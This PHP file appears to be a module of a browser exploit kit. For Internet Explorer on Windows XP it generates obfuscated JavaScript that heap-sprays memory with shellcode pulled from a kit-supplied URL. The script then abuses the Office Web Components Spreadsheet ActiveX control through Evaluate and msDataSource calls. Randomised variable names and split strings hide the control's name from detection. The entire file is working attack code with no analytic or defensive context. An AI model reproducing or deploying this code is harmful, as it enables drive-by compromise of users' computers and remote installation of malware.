<?php

if (( $browser == 'ie' && $os == 'xp' )) {
	$randVar = $GLOBALS['cpFunctions']->CreateArrayString( rand( 10, 30 ), '100' );
	$strUrl = $GLOBALS['cpXplHelper']->GetURL( 'other', $browser, $os, 'spreadsheet' );
	$functionName = $ExploitFunctions[13];
	$replaceFunction = $GLOBALS['cpFunctions']->RandAlpha( 2 );
	$eArray[] = '
function ' . $functionName . '()
{
	var ' . $randVar[12] . ' = "' . $GLOBALS['cpXplHelper']->GetJSShellcode( $strUrl, $replaceFunction ) . '".replace(/' . $replaceFunction . '/g,"Au".replace(/A/g,"B").replace(/B/g,unescape("%25")));
	var ' . $randVar[2] . ' = unescape(' . $randVar[12] . ');
	var ' . $randVar[11] . ' = "' . $randVar[13] . '0b0c' . $randVar[13] . '0b0c".replace(/' . $randVar[13] . '/g,"Au".replace(/A/g,"B").replace(/B/g,unescape("%25")));
	var ' . $randVar[3] . ' = unescape(' . $randVar[11] . ');
	while (' . $randVar[3] . '.length < 0x100000)
		' . $randVar[3] . ' += ' . $randVar[3] . ';
		' . $randVar[4] . ' = 0x100000 - (' . $randVar[2] . '.length + 20);
		' . $randVar[3] . ' = ' . $randVar[3] . '.substring(0, ' . $randVar[4] . ');
		' . $randVar[5] . ' = new Array();
	for (var i = 0 ; i < 100 ; i++){
		' . $randVar[5] . '[i] = ' . $randVar[3] . ' + ' . $randVar[2] . ';
	}
		' . $randVar[7] . '();
	}
	function ' . $randVar[7] . '()
	{
          var ' . $randVar[8] . ', ' . $randVar[9] . ';
	try {
			' . $randVar[8] . ' = new ActiveXObject("' . $randVar[2] . 'O' . $randVar[2] . 'W' . $randVar[2] . 'C' . $randVar[2] . '1' . $randVar[2] . '0.' . $randVar[2] . 'S' . $randVar[2] . 'p' . $randVar[2] . 'r' . $randVar[2] . 'e' . $randVar[2] . 'a' . $randVar[2] . 'd' . $randVar[2] . 's' . $randVar[2] . 'h' . $randVar[2] . 'e' . $randVar[2] . 'e' . $randVar[2] . 't".replace(/' . $randVar[2] . '/g,\'\'));
	} catch (err) {
              try {
                  ' . $randVar[8] . ' = new ActiveXObject("' . $randVar[2] . 'O' . $randVar[2] . 'W' . $randVar[2] . 'C' . $randVar[2] . '1' . $randVar[2] . '1' . $randVar[2] . '.' . $randVar[2] . 'S' . $randVar[2] . 'pr' . $randVar[2] . 'e' . $randVar[2] . 'a' . $randVar[2] . 'd' . $randVar[2] . 's' . $randVar[2] . 'h' . $randVar[2] . 'e' . $randVar[2] . 'e' . $randVar[2] . 't".replace(/' . $randVar[2] . '/g,\'\'));
         		} catch (err) {
		}
	}
       ' . $randVar[9] . ' = new Array();
       ' . $randVar[9] . '.push(1);
       ' . $randVar[9] . '.push(2);
       ' . $randVar[9] . '.push(0);
       ' . $randVar[9] . '.push(window);
	for (var i = 0 ; i < ' . $randVar[9] . '.length ; i++) {
              for (var j = 0 ; j < 10 ; j++) {
                  try {
                      ' . $randVar[8] . '.Evaluate(' . $randVar[9] . '[i]);
                  } catch (err) {
					{next}
					return;
				}
			}
		}
		window.status = ' . $randVar[9] . '[3] + "";
		for (var j = 0 ; j < 10 ; j++) {
		try {
			' . $randVar[8] . '.msDataSource(' . $randVar[9] . '[3]);
		} catch (err) {
		{next}
		return;
		}
	}
	{next}
}';
}

?>
